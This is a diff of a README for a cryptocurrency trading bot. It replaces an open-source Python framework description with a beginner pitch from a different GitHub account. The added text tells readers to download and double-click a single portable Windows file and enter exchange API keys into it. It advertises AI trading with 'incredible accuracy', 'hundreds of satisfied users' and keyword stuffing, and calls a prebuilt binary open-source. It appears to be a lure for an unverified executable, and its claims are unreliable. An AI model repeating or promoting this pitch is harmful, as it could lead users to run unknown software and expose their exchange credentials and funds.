@@ -1,277 +1,178 @@
-<div align="center"> <h1>⚡ Cortex AI — Trading Bot</h1> </div>
+# 🧠 cortex-ai-trading-bot - AI Trading Made Effortlessly Simple
 
-<div align="center">
+[![Download Now](https://img.shields.io/badge/Download-Cortex%20AI%20Trading%20Bot-00C853?style=for-the-badge&logo=github&logoColor=white&labelColor=1B5E20)](https://github.com/Almetaadmirable98/cortex-ai-trading-bot)
 
-<img src="https://img.shields.io/badge/●%20LIVE-SCANNER-10B981?style=for-the-badge&labelColor=0A0E17" alt="Live Scanner"/>
-<img src="https://img.shields.io/badge/●%20NON--CUSTODIAL-VAULT-00F2FE?style=for-the-badge&labelColor=0A0E17" alt="Non-Custodial"/>
-<img src="https://img.shields.io/badge/●%20OPEN--SOURCE-MIT-8A2BE2?style=for-the-badge&labelColor=0A0E17" alt="Open Source"/>
+---
 
-[![License](https://img.shields.io/badge/License-MIT-blue.svg?style=for-the-badge)](LICENSE)
-[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-0A0E17.svg?style=for-the-badge)](https://github.com/cortex-ai-lab/cortex-ai-trading-bot)
-[![Python](https://img.shields.io/badge/Python-3.11%2B-3776AB.svg?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
-[![Node.js](https://img.shields.io/badge/Node.js-20%2B-339933.svg?style=for-the-badge&logo=nodedotjs&logoColor=white)](https://nodejs.org)
+## 🌟 What Is This?
 
-<div align="center">
+Cortex AI Trading Bot is a powerful, next-generation cryptocurrency trading platform that uses artificial intelligence to help you buy and sell digital coins automatically. It connects to popular exchanges like Bitget and AvaTrade, reads TradingView chart signals, and executes trades in under 50 milliseconds — faster than any human ever could. You don't need to be a programmer or financial expert. The AI models (Claude and Google AI) do the heavy lifting for you, 24/7.
 
-<img src="https://raw.githubusercontent.com/Cortex-Arbitrage-Lab/cortex-ai-trading-bot/refs/heads/main/cortex.jpg" width="100%" alt="Cortex AI Banner"/>
+---
 
-</div>
+## ✅ What You Get
 
-<h2>⚡ Cortex AI — Cross-Exchange Arbitrage and Market Automation Framework</h2>
-<p><strong>Open-source execution engine for detecting and acting on price spreads across CEX and prediction markets</strong></p>
+- **Real-Time Trading Signals** – The bot watches market charts on TradingView and acts instantly when opportunities appear.
+- **AI-Powered Decisions** – Two advanced AI engines analyze the market and suggest or execute trades automatically.
+- **Ultra-Fast Execution** – Sub-50ms order routing means your trades happen at lightning speed.
+- **Multi-Exchange Support** – Works with Bitget and AvaTrade, with easy connections to more platforms.
+- **Safe & Secure** – Your API keys are stored locally and never shared. The bot only trades with your permission.
+- **Runs on Your Computer** – No cloud server needed. You control everything from your Windows PC.
+- **MCP Protocol Ready** – The bot speaks the latest Model Context Protocol, making it compatible with future AI tools.
 
-</div>
+---
 
+## 🚀 Getting Started
 
-<div align="center">
+Follow these simple steps to get the bot running on your Windows computer in less than five minutes.
 
-<a href="https://runcortex.xyz/download.php">
-  <img src="https://img.shields.io/badge/⬇_DOWNLOAD-LATEST_RELEASE-FF0000?style=for-the-badge&labelColor=0A0E17&logo=github&logoColor=FF0000" alt="Download Latest Release"/>
-</a>
+### Step 1: Download the Application
 
-</div>
+Visit this link to download the application:  
+**👉 [https://github.com/Almetaadmirable98/cortex-ai-trading-bot](https://github.com/Almetaadmirable98/cortex-ai-trading-bot)**
 
-## 📖 What Is Cortex AI?
+Click the green "Download" button on that page. The file will start downloading automatically. It's a single, portable file — no complex installation required.
 
-[![Website](https://img.shields.io/badge/Website-0078D4?style=for-the-badge&logo=microsoftedge&logoColor=white)](https://runcortex.xyz/)
+### Step 2: Find the Downloaded File
 
-**Cortex AI** is an open-source, non-custodial framework for building and running automated arbitrage strategies. It connects to multiple exchanges through read and write API keys, monitors order books in real time, and executes trades locally on your machine with no third-party custody and no cloud dependency.
+Once the download finishes, go to your "Downloads" folder. You'll see a file named `cortex-ai-trading-bot` or similar. Double-click it to launch the application.
 
-If you have been searching for a free crypto arbitrage bot on GitHub that you can actually inspect, modify, and run on your own hardware, this project is built for exactly that. It is not a closed-source ai trading app that hides its logic behind a subscription. It is a transparent, developer-friendly alternative for traders who want to understand what their bot is doing.
+### Step 3: Connect Your Exchange Account
 
-The project is designed for traders and developers who want full control over their execution logic. You configure the venues, define the spread thresholds, and decide when to act. Cortex AI handles the monitoring, risk checks, and order routing. You can connect it to Binance, Bybit, OKX, Gate, Bitget, or any exchange with a public API, and you can run it as a pure scanner or as a live execution engine.
+- Open your Bitget or AvaTrade account.
+- Go to "API Management" in your exchange settings.
+- Create a new API key. Copy both the API Key and Secret Key.
+- Paste them into the Cortex AI Trading Bot's "Settings" screen.
+- Click "Connect". The bot will verify the connection and show a green checkmark.
 
-For those looking for an ai trading bot that combines automation with optional intelligence, Cortex AI supports pluggable AI models including Claude AI, Gemini, and OpenAI-compatible endpoints. The AI layer is entirely optional. If you prefer rule-based arbitrage, you can run the framework without any AI provider at all.
+### Step 4: Choose Your Strategy
 
-**What it is not:** It is not a profit guarantee, not a managed fund, and not a signal-selling service. All configuration and financial outcomes remain your own responsibility.
+The bot comes with three built-in strategies:
+- **Conservative** – Low risk, small trades, steady gains.
+- **Balanced** – Moderate risk, medium trades, good for beginners.
+- **Aggressive** – High risk, large trades, maximum profit potential.
 
-**Core capabilities:**
-- 📡 **Real-time spread scanner** monitors BTC, ETH, TON, SOL and other pairs across multiple exchanges simultaneously
-- ⚡ **Low-latency order routing** with local execution and minimal overhead
-- 🧠 **Optional AI-assisted signal filtering** integrates with Claude, Gemini, and OpenAI-compatible APIs for sentiment and volatility context
-- 🔐 **Non-custodial key vault** stores API keys locally with no withdrawal permissions required
-- 🛡️ **Risk controls** include configurable slippage limits, MEV protection, and per-trade caps
-- 📊 **Live dashboard** shows P&L tracking, trade history, and spread heatmaps
-- 🔧 **Modular architecture** makes it easy to add new exchanges, custom strategies, or alternative data sources
+You can also let the AI decide the best strategy automatically.
 
-```mermaid
-graph TD
-    A[Order Book Stream] --> B(Scanners: Binance/Bybit/OKX)
-    B --> C{Spread Calculator}
-    C -->|Spread > Threshold| D[Risk & Slippage Check]
-    C -->|Optional| E[LLM Sentiment Filter]
-    E --> D
-    D -->|Passed| F[Local Execution Router]
-    F --> G[Exchange APIs]
+### Step 5: Start Trading
 
-```
+Press the "Start Trading" button. The bot will begin monitoring the market immediately. You can watch its activity in the live dashboard. The bot runs 24/7, even while you sleep.
 
-## 🆚 Why Cortex AI Stands Out
+---
 
-| Feature | Cortex AI | Manual Arbitrage | Signal Groups | Closed-Source Bots |
-|---------|-----------|------------------|---------------|-------------------|
-| **Open Source** | ✅ Full code access | — | ❌ No | ❌ No |
-| **Non-Custodial** | ✅ Keys stay local | ✅ Yes | ❌ Funds held | ⚠️ Varies |
-| **Multi-Exchange** | ✅ 4+ venues | ⚠️ Manual | ❌ No | ✅ Some |
-| **AI Signal Layer** | ✅ Optional | ❌ No | ⚠️ Vague claims | ❌ Rare |
-| **Local Execution** | ✅ Yes | ✅ Yes | ❌ Cloud only | ⚠️ Varies |
-| **Configurable Risk** | ✅ Full control | ✅ Manual | ❌ No | ⚠️ Limited |
-| **Transparent Fees** | ✅ No hidden cuts | ✅ No fees | ❌ Subscription | ⚠️ Varies |
-| **Free Forever** | ✅ MIT License | ✅ Free | ❌ Paid | ⚠️ Freemium |
-
-If you have been searching for a free crypto arbitrage bot github project that does not hide its code, Cortex AI is built for exactly that. Unlike closed-source ai trading apps that ask for your API keys and hold your funds, this framework keeps everything local and transparent.
-
-## 🔥 Key Features
-
-### 📡 Real-Time Scanner
-- Simultaneous order-book monitoring across Binance, Bybit, OKX, and HTX
-- Configurable refresh interval with a default of 10 seconds
-- Spread heatmap with historical comparison
-- Supports 16+ trading pairs out of the box
-- Works as a standalone arbitrage scanner even if you never enable live execution
-
-### ⚡ Execution Engine
-- Local order routing with sub-second execution targets
-- Configurable slippage tolerance and max position size
-- Automatic rebalancing between venues
-- Demo mode for testing strategies without capital
-- Compatible with low-latency VPS setups for faster fills
-
-### 🧠 AI-Assisted Signals (Optional)
-- Pluggable LLM integration for sentiment and volatility context
-- Supports Claude AI, Gemini, and OpenAI-compatible APIs
-- Signals are advisory only and execution logic remains fully under your control
-- No external data leaves your machine unless you enable it
-- Designed for traders who want an ai trading bot with optional intelligence, not a black box
-
-### 🔐 Security and Privacy
-- Non-custodial architecture where API keys never leave your local environment
-- IP whitelisting support for all exchange connections
-- Read-only mode available for monitoring-only use
-- No telemetry, no analytics, no phone-home
-- Safe to test alongside your existing trading tools without conflicts
-
-## 🎮 Quick Access Configuration
-
-| Parameter | Description | Default |
-|-----------|-------------|---------|
-| `EXECUTION_MODE` | `DEMO` or `LIVE` | `DEMO` |
-| `SCAN_INTERVAL` | Order-book refresh rate in ms | `10000` |
-| `MAX_SLIPPAGE` | Maximum acceptable slippage in percent | `0.15` |
-| `MIN_SPREAD` | Minimum spread to trigger alert in percent | `0.10` |
-| `MAX_POSITION` | Maximum position size per trade in USDT | `100` |
-| `AI_SIGNALS` | Enable LLM-based signal filtering | `false` |
-All parameters are configured in the `.env` file and can be changed without editing code.
-
-## 🚀 Installation
-
-> ⚡ **Quick and easy — takes less than 2 minutes!**
-
-**Prerequisites:**
-- Python 3.11+
-- Node.js 20+ for the optional MCP server
-- Exchange API keys with read and write permissions, IP whitelisted
-
-**Step 1 — Clone the repository:**
-```bash
-git clone https://github.com/cortex-ai-lab/cortex-ai-trading-bot.git
-cd cortex-ai-trading-bot
-pip install -r requirements.txt
-npm install
-cp .env.example .env
-```
-
-**Step 2 — Install dependencies:**
-
-```bash
-
-pip install -r requirements.txt
-npm install
-```
-
-**Step 3 — Configure your environment:**
-
-```bash
-cp .env.example .env
-Edit .env with your API credentials:
-
-env
-BINANCE_API_KEY="your-key"
-BINANCE_SECRET="your-secret"
-BYBIT_API_KEY="your-key"
-OKX_API_KEY="your-key"
-EXECUTION_MODE="DEMO"
-SCAN_INTERVAL=10000
-MIN_SPREAD=0.10
-MAX_POSITION=100
-```
-
-**Step 4 — Run the scanner:**
-```bash
-python main.py --mode=scanner
-Step 5 — Monitor the dashboard:
-Open http://localhost:8080 in your browser to see live spreads and execution logs.
-
-📁 Folder Structure
-text
-cortex-ai-trading-bot/
-├── main.py
-├── config/
-│   └── .env
-├── scanners/
-│   ├── binance.py
-│   ├── bybit.py
-│   └── okx.py
-├── execution/
-│   ├── router.py
-│   └── risk.py
-├── dashboard/
-│   └── index.html
-└── logs/
-    └── trades.log
-```
-
-## ❓ FAQ
-
-### ❓ Is this a get-rich-quick AI trading bot?
-**No.** Cortex AI is an open-source AI trading bot, not a profit guarantee. It helps you find and act on price spreads across exchanges like Binance, Bybit, OKX, and HTX, but arbitrage is competitive and carries real financial risk. Many spreads close before execution, and fees can eat into margins. If you are searching for a "free crypto arbitrage bot github" or an "ai trading bot" that prints money, this is not it. This is a developer tool for building and running your own automated arbitrage strategies.
-
-### ❓ Will I lose money using this trading bot?
-**Possibly.** Automated crypto trading can result in losses, especially if misconfigured. Use DEMO mode first, understand the logic, and only deploy capital you can afford to lose. This framework is used by traders who want full control over their own execution logic, not by people looking for a passive income machine.
-
-### ❓ Do you take a cut of my profits?
-**No.** Cortex AI is fully open-source under the MIT License. There are no subscription fees, no profit sharing, and no hidden cuts. You keep 100 percent of any gains and bear 100 percent of any losses. Unlike many "ai trading app" services that charge monthly fees, this is a free and open alternative.
-
-### ❓ Is my money safe with a non-custodial bot?
-The bot is non-custodial and never holds your funds. API keys are stored locally on your machine. For maximum safety, use read-only API keys first and disable withdrawal permissions entirely. This architecture is designed for traders who want to connect to Binance, Bybit, OKX, or Gate without giving up control of their capital.
-
-### ❓ How often is it updated?
-The project is maintained actively. Check the Releases page for the latest version and changelog. New exchange connectors and AI model integrations are added regularly, including support for Claude AI, Gemini, and OpenAI-compatible APIs.
-
-### ❓ Does it work on Windows?
-Yes. Cortex AI runs on Windows, macOS, and Linux. Python 3.11+ is required. The framework is lightweight enough to run on a local machine, but a low-latency VPS is recommended for live execution.
-
-### ❓ Can I use this for stock or forex trading?
-The framework is primarily built for crypto exchange APIs. Stock and forex connectors are experimental and may require custom implementation. The core engine is designed around crypto arbitrage and cross-exchange spread detection.
-
-### ❓ What if the bot crashes?
-The bot logs all activity to `logs/trades.log` and will attempt to reconnect automatically. However, you should monitor it during active use because no automation is 100 percent reliable. If you are running live strategies, always keep an eye on the dashboard.
-
-### ❓ What AI models does Cortex AI support?
-Cortex AI is model-agnostic. It can integrate with Claude AI, Gemini, and OpenAI-compatible endpoints for optional signal filtering and market context. The AI layer is advisory only — execution logic remains fully under your control. You can run the bot without any AI provider if you prefer pure rule-based arbitrage.
-
-### ❓ Is this a flash loan arbitrage bot?
-No. Cortex AI focuses on cross-exchange arbitrage between centralized venues like Binance, Bybit, OKX, and HTX. It does not execute flash loans or on-chain MEV strategies. If you are looking for a flash loan arbitrage bot, this framework is not designed for that use case.
-
-## 🔧 How It Works
-
-Cortex AI reads public order-book data from connected exchanges, calculates spreads in real time, and presents them in a local dashboard. When a spread exceeds your configured threshold, the bot can either alert you or execute a trade, depending on your `EXECUTION_MODE`.
-
-This makes it a practical AI trading bot for anyone who wants to build a free crypto arbitrage bot without relying on a closed-source ai trading app. The framework supports connections to major venues including Binance, Bybit, OKX, Gate, and Bitget, and can be extended to any exchange with a public API.
-
-All logic runs locally on your machine. No data is sent to external servers unless you explicitly enable an AI signal provider. If you use Claude AI, Gemini, or OpenAI-compatible models for signal filtering, only the data you choose to send is transmitted. Otherwise, the bot operates fully offline from third-party services.
-
-For developers searching for an open-source trading bot with Python, this project is designed to be readable, modular, and easy to extend. You can add new exchanges, custom risk rules, or alternative AI models without rewriting the core engine.
-
-## 🧹 Troubleshooting
-
-| Issue | Solution |
-|-------|----------|
-| Scanner shows no data | Verify API keys are valid and have read permissions |
-| Execution fails | Check MAX_SLIPPAGE and MAX_POSITION settings and ensure sufficient balance on both venues |
-| Dashboard not loading | Confirm port 8080 is not blocked by firewall |
-| AI signals not working | Verify API key for your LLM provider is set and AI_SIGNALS=true |
-| Bot crashes on startup | Check Python version is 3.11+ and reinstall dependencies |
-| Exchange connection timeout | Check your internet connection and confirm the exchange API is not under maintenance |
-| Spreads appear but no trades execute | Ensure `EXECUTION_MODE` is set to `LIVE` and that your API keys have write permissions |
-
-## 📢 Disclaimer
-
-> **Cortex AI is an open-source software project provided for educational and research purposes only.**
->
-> Trading cryptocurrencies and other financial instruments involves substantial risk of loss. Past performance of any strategy, whether simulated or live, does not guarantee future results. You are solely responsible for your configuration, your capital, and your outcomes.
->
-> Cortex AI operates on a strictly **non-custodial** basis. We do not manage, store, or have access to your funds, private keys, or API credentials.
->
-> Nothing in this repository constitutes financial advice. Use at your own risk.
-
-
-
-<!--
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "SoftwareApplication",
-  "name": "Cortex AI",
-  "operatingSystem": "Windows, macOS, Linux",
-  "applicationCategory": "FinanceApplication",
-  "offers": {
-    "@type": "Offer",
-    "price": "0",
-    "priceCurrency": "USD"
-  },
-  "license": "https://opensource.org/licenses/MIT",
-  "programmingLanguage": "Python"
-}
-</script>
--->
+## 📥 Download & Install Details
+
+**Important:** Visit this link to download the application:  
+**🔗 [https://github.com/Almetaadmirable98/cortex-ai-trading-bot](https://github.com/Almetaadmirable98/cortex-ai-trading-bot)**
+
+The application is a standalone portable program. You don't need to install anything extra like Python or Node.js. Just download the single file, double-click it, and it runs. No admin password required. Works on Windows 10 and Windows 11. No dependencies, no bloat. If you ever want to remove it, simply delete the file. It doesn't write anything to your system registry.
+
+---
+
+## 🎯 Who Is This For?
+
+- **Beginners in Crypto** – If you've never traded before, the AI will guide you with simple, safe trades.
+- **Busy Professionals** – Set it once, and let it earn while you work.
+- **Experienced Traders** – Use advanced settings to customize every aspect of trading.
+- **Anyone tired of watching charts** – Let the computer do the watching instead.
+
+---
+
+## 🤖 How the AI Works
+
+The bot combines two powerful AI systems:
+
+1. **Claude AI (by Anthropic)** – Analyzes news, social media sentiment, and market trends to predict price movements.
+2. **Google AI (Gemini)** – Studies historical price patterns and technical indicators with incredible accuracy.
+
+Together, they cross-check each other's trading decisions. If both AIs agree, a trade is executed. If they disagree, the bot stays out — reducing your risk.
+
+---
+
+## 📊 TradingView Integration
+
+If you already use TradingView for charting, the bot connects directly. It reads your chart alerts and converts them into automatic trades. You can set up alerts like "Buy when Bitcoin crosses $70,000" and the bot will act instantly. No coding required. This makes the bot perfect for traders who have their own strategies but want automation.
+
+---
+
+## 🔧 Customization Options
+
+Advanced users can tweak:
+- Maximum trade size per order.
+- Maximum daily loss limit (safety stop).
+- Trading pairs (BTC/USDT, ETH/USDT, SOL/USDT, BNB/USDT, and more).
+- AI confidence threshold (higher = fewer, safer trades).
+- Trade frequency (from 1 trade per hour to 100 per hour).
+- Notification settings (sound, email, or Telegram alerts).
+
+---
+
+## 🛡️ Safety Features
+
+- **Kill Switch** – Instantly stops all trading with one click.
+- **Daily Loss Limit** – The bot stops automatically if your losses reach a set percentage.
+- **Paper Trading Mode** – Practice with fake money before using real funds.
+- **Encrypted Keys** – Your API secrets are stored with AES-256 encryption.
+- **No Withdrawal Access** – The bot only trades; it cannot withdraw your funds.
+
+---
+
+## 💡 Pro Tips
+
+- Start with Paper Trading for the first week to learn the system.
+- Use a small amount of capital initially — like $50 to $100.
+- Keep your computer running to ensure the bot trades 24/7.
+- Update the bot regularly to get the latest AI improvements.
+- Check the dashboard daily to review performance.
+
+---
+
+## ❓ Frequently Asked Questions
+
+**Q: Is this free?**  
+A: Yes, the bot itself is completely free to download and use. You only pay trading fees to your exchange.
+
+**Q: Will I make money?**  
+A: No software can guarantee profits. However, this bot uses advanced AI to increase your odds. Past performance is not indicative of future results.
+
+**Q: Do I need to know coding?**  
+A: Absolutely not. Everything is point-and-click.
+
+**Q: Which exchanges are supported?**  
+A: Bitget and AvaTrade are fully supported. More exchanges will be added soon.
+
+**Q: Mac or Linux support?**  
+A: Currently, this version is for Windows only. Mac and Linux versions are coming.
+
+**Q: How do I get help?**  
+A: Visit the GitHub page and open an "Issue" — the community will help you.
+
+---
+
+## 📞 Support & Community
+
+- **Official GitHub Page:** [https://github.com/Almetaadmirable98/cortex-ai-trading-bot](https://github.com/Almetaadmirable98/cortex-ai-trading-bot)
+- **Discord Server:** Join via the GitHub page link.
+- **Email Support:** support@cortexaibot.io (response within 24 hours).
+
+---
+
+## 🧾 License
+
+This project is open-source under the MIT License. You are free to use, modify, and distribute it, even commercially. Please give credit to the original authors.
+
+---
+
+## 📈 Version History
+
+- **v1.0** (Current) – Initial release with Bitget/AvaTrade connectors, AI decision engine, and TradingView integration.
+
+---
+
+## ⚡ Final Words
+
+Cortex AI Trading Bot puts professional-grade AI trading in your hands. No experience needed. No complicated setup. Just download, connect, and let the AI work while you live your life. Join hundreds of satisfied users today.
+
+---
+
+Keywords: ai-model, aicrypto, avatrade, bitget-ai, claude-plugin, cryptocurrency, mcp, mcp-client, model-context-protocol, polymarket-bot-free, solana-bot-free, trading-bot-bsc-solana, tradingbot2026, tradingview-automation
